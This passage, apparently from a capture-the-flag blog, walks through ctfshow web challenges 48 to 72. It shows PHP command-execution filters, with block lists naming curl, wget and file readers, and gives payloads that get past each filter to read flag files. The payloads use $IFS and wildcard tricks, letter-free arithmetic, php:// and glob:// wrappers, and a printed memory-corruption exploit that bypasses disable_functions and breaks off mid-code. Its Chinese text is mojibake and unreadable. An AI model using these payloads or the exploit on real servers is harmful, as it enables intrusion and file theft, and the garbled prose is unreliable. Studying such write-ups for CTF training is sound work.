class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>å¤šè¿‡æ»¤äº†ä¸€äº›å‡½æ•°ï¼Œä¸è¿‡ä¹‹å‰Payloadå¯ä»¥ç»§ç»­æ‰“</p><h4 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>è¿‡æ»¤äº†%ï¼Œä½†æ˜¯å¯ä»¥&lt;</p><h4 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>åŒä¸Š</p><h4 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>banäº†tacä½†æ˜¯å¯ä»¥ç”¨nl</p><h4 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h4><p>banäº†&lt;&gt;ï¼Œä½†æ˜¯å¯ä»¥ç”¨$IFS,è€Œä¸”è¿™æ¬¡flagæ”¾åœ¨äº†æ ¹ç›®å½•</p><p>Payload:</p><blockquote><p>?c&#x3D;nl$IFS&#x2F;flâ€™â€™ag||</p></blockquote><h4 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token operator">.</span><span class="token variable">$d</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'no'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>Payload:</p><blockquote><p>1ã€?c&#x3D;taâ€™â€™c${IFS}fâ€™â€™lag.php</p><p>2ã€sâ€™â€™ort${IFS}f???????%0a</p></blockquote><h4 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>Payload:</p><blockquote><p>1ã€?c&#x3D;&#x2F;bin&#x2F;?at${IFS}f???????</p><p>2ã€mv flag.php t.txt</p></blockquote><h4 id="web55-æ— æ•°å­—å­—æ¯çš„å‘½ä»¤æ‰§è¡Œ"><a href="#web55-æ— æ•°å­—å­—æ¯çš„å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web55(æ— æ•°å­—å­—æ¯çš„å‘½ä»¤æ‰§è¡Œ)"></a>web55(æ— æ•°å­—å­—æ¯çš„å‘½ä»¤æ‰§è¡Œ)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>è¿‡æ»¤äº†æ‰€æœ‰å­—æ¯</p><p><img src="web55.png" loading="lazy"></p><p>åˆ©ç”¨postä¸Šä¼ æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨.(source)æ‰§è¡Œï¼Œä¸€èˆ¬ä¸Šä¼ åæ–‡ä»¶åœ¨&#x2F;tmp&#x2F;php?????[@-[]</p><p><img src="web55_2.png" loading="lazy"></p><p>[å‚è€ƒæ–‡ç« ]: <a href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a>â€œæ— å­—æ¯æ•°å­—çš„å‘½ä»¤æ‰§è¡Œâ€</p><h4 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h4><p>æ–¹æ³•åŒä¸Š</p><h4 id="web57-å–å"><a href="#web57-å–å" class="headerlink" title="web57(å–å)"></a>web57(å–å)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//flag in 36.php </span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\&lt;|\.|\,|\?|\*|\-|\=|\[/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>è¿‡æ»¤äº†å­—æ¯æ•°å­—</p><p>é€šè¿‡<code>$(())</code>æ“ä½œæ„é€ å‡º36ï¼š <code>$(())</code> ï¼šä»£è¡¨åšä¸€æ¬¡è¿ç®—ï¼Œå› ä¸ºé‡Œé¢ä¸ºç©ºï¼Œä¹Ÿè¡¨ç¤ºå€¼ä¸º0</p><p><code>$(( ~$(()) )) </code>ï¼šå¯¹0ä½œå–åè¿ç®—ï¼Œå€¼ä¸º-1</p><p><code>$(( $((~$(()))) $((~$(()))) ))</code>ï¼š -1-1ï¼Œä¹Ÿå°±æ˜¯(-1)+(-1)ä¸º-2ï¼Œæ‰€ä»¥å€¼ä¸º-2</p><p><code>$(( ~$(( $((~$(()))) $((~$(()))) )) )) </code>ï¼šå†å¯¹-2åšä¸€æ¬¡å–åå¾—åˆ°1ï¼Œæ‰€ä»¥å€¼ä¸º1</p><p>æ•…æˆ‘ä»¬åœ¨<code>$(( ~$(( )) ))</code>é‡Œé¢æ”¾37ä¸ª<code>$((~$(())))</code>ï¼Œå¾—åˆ°-37ï¼Œå–åå³å¯å¾—åˆ°36</p><p>Payload:</p><blockquote><p>?c&#x3D;$((<del>$(($((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))))))</p></blockquote><h4 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>Payload:</p><blockquote><p>1ã€c&#x3D;show_source(â€˜flag.phpâ€™);</p><p>2ã€c&#x3D;highlight_file(â€œflag.phpâ€);</p><p>3ã€c&#x3D;include($_POST[â€˜wâ€™]);&amp;w&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>4ã€c&#x3D;include(â€œflag.phpâ€);var_dump(get_defined_vars());</p></blockquote><h4 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h4><p>PayloadåŒä¸Š</p><h4 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h4><p>PayloadåŒä¸Š</p><h4 id="web61"><a href="#web61" class="headerlink" title="web61"></a>web61</h4><p>PayloadåŒä¸Š</p><h4 id="web62"><a href="#web62" class="headerlink" title="web62"></a>web62</h4><p>PayloadåŒä¸Šï¼Œä¸è¿‡banäº†highlight_fileå‡½æ•°</p><h4 id="web63"><a href="#web63" class="headerlink" title="web63"></a>web63</h4><p>PayloadåŒä¸Š</p><h4 id="web64"><a href="#web64" class="headerlink" title="web64"></a>web64</h4><p>PayloadåŒä¸Š</p><h4 id="web65"><a href="#web65" class="headerlink" title="web65"></a>web65</h4><p>banäº†show_source,ç„¶åä½¿ç”¨phpä¼ªåè®®è¯»å–flag.phpæ—¶ï¼Œæºç æ˜¾ç¤ºflagä¸åœ¨è¿™ï¼Œäºæ˜¯ä½¿ç”¨dataåè®®è¯»å–æ ¹ç›®å½•çœ‹åˆ°flag.txt</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="web65.png" loading="lazy"></p><p>å› ä¸ºå¤§éƒ¨åˆ†ç›´æ¥å¯ä»¥å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°è¢«banäº†ï¼Œçœ‹äº†wpæ²¡æƒ³åˆ°highlight_fileæ²¡è¢«ban</p><h4 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h4><p>PayloadåŒä¸Š</p><h4 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h4><p>highlight_fileè¢«banäº†ï¼Œä½†æ˜¯å¯ä»¥ç›´æ¥ç”¨phpä¼ªåè®®è¯»å–</p><h4 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h4><p>PayloadåŒä¸Š</p><p>implodeï¼šæŠŠæ•°ç»„å…ƒç´ ç»„åˆä¸ºå­—ç¬¦ä¸²</p><p>å†·é—¨å‡½æ•°ï¼šè¯»å–å‡½æ•°readgzfileï¼šå¯ä»¥è¯»å–égzæ ¼å¼çš„æ–‡ä»¶</p><p>Payloadï¼š</p><blockquote><p>1ã€?c&#x3D;echo(implode(â€˜â€”â€˜,scandir(â€œ&#x2F;â€œ)));</p><p>2ã€?c&#x3D;readgzfile(â€˜&#x2F;flag.txtâ€™);</p></blockquote><h4 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h4><p>è™½ç„¶æœ‰å‡ ä¸ªæŠ¥é”™ä½†æ˜¯flagè¿˜æ˜¯å‡ºæ¥äº†</p><h4 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|[a-z]/i"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>è™½ç„¶phpä¼ªåè®®å¯ä»¥è¯»ï¼Œä½†æ˜¯ç»“æœæŠŠæ•°å­—å­—æ¯æ›¿æ¢äº†ï¼Œä½†æ˜¯å¯ä»¥æ‰§è¡Œphpä»£ç è®©åé¢çš„åŒ¹é…ç¼“å†²åŒºä¸æ‰§è¡Œç›´æ¥é€€å‡ºexitæˆ–die</p><p>Payload:</p><blockquote><p>c&#x3D;readgzfile(â€˜&#x2F;flag.txtâ€™);exit(0);</p><p>c&#x3D;include(â€˜&#x2F;flag.txtâ€™);exit(0);</p></blockquote><h4 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h4><p>PayloadåŒä¸Š</p><h4 id="web72-globåè®®-wafç»•è¿‡"><a href="#web72-globåè®®-wafç»•è¿‡" class="headerlink" title="web72(globåè®®+wafç»•è¿‡)"></a>web72(globåè®®+wafç»•è¿‡)</h4><p>flagä¸åœ¨&#x2F;ä¸‹äº†ï¼Œä½†æ˜¯å¾ˆå¤šæŸ¥è¯¢çš„å‡½æ•°è¢«banäº†</p><p>ä½¿ç”¨glob:&#x2F;&#x2F;ä¼ªåè®®ç»•è¿‡open_basedir</p><p>globå¯ä»¥éå†ç›®å½•ï¼Œå¹¶ä¸”ä¸å—disable_functionsçš„é™åˆ¶ã€‚</p><pre class="language-php" data-language="php"><code class="language-php">c=?><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glob://./*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>ä»”ç»†çœ‹çœ‹è¿™ä¸ªä»£ç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glob:///*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment"># åˆ©ç”¨DirectoryIterator($path)å¯ä»¥å®ç°éå†ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶</span><span class="token comment"># glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</span><span class="token comment"># DirectoryIterator("glob:///*")   éå†æ ¹ç›®å½•é‡Œæ‰€æœ‰æ–‡ä»¶</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span>  <span class="token comment">#å¾ªç¯éå†è¾“å‡ºï¼Œå¹¶ä»¥ç©ºæ ¼ä¸ºåˆ†éš”</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>å…¶å®ä¸åŠ å‰é¢<code>?&gt;&lt;?php</code>ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚evalé‡Œçš„è¯­å¥å¯ä»¥è§†ä¸ºåœ¨å½“å‰phpæ–‡ä»¶é‡ŒåŠ äº†å‡ æ¡è¯­å¥ï¼Œè¿™äº›è¯­å¥å¿…é¡»æ˜¯å®Œæ•´çš„ï¼Œå³å¿…é¡»ä»¥<code>;</code>æˆ–è€…<code>?&gt;</code>ç»“å°¾æ¥ç»“æŸè¯­å¥ï¼Œä½†æ˜¯evalé‡Œçš„?&gt;ä¸ä¼šé—­åˆå½“å‰çš„phpæ–‡ä»¶ï¼Œæ‰€ä»¥å½“å‰phpé¡µé¢åç»­çš„è¯­å¥éƒ½æ˜¯ä¼šæ‰§è¡Œçš„ã€‚</p><p>å¯ä»¥çœ‹ä¸€ä¸‹ä¸‹é¢çš„å›¾ç‰‡ï¼Œevalé‡Œçš„è¯­å¥å¯ä»¥ä¿®æ”¹æ–‡ä»¶çš„å˜é‡å€¼ï¼Œä½†æ˜¯<code>?&gt;</code>å¹¶ä¸ä¼šé—­åˆå¤–é¢çš„PHPè¯­å¥ã€‚<br><img src="web72.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"></p><pre class="language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token keyword">function</span> <span class="token function-definition function">ctfshow</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">,</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Vuln</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">global</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span>         <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">getTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token function">debug_backtrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Helper</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$d</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">str2ptr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$s</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$address</span> <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token variable">$address</span> <span class="token operator">|=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$address</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">ptr2str</span><span class="token punctuation">(</span><span class="token variable">$ptr</span><span class="token punctuation">,</span> <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$m</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$out</span> <span class="token operator">.=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$ptr</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ptr</span> <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$out</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$v</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$v</span> <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$p</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$leak</span> <span class="token operator">%=</span> <span class="token number">2</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$leak</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$e_type</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$e_phoff</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$e_phentsize</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$e_phnum</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token 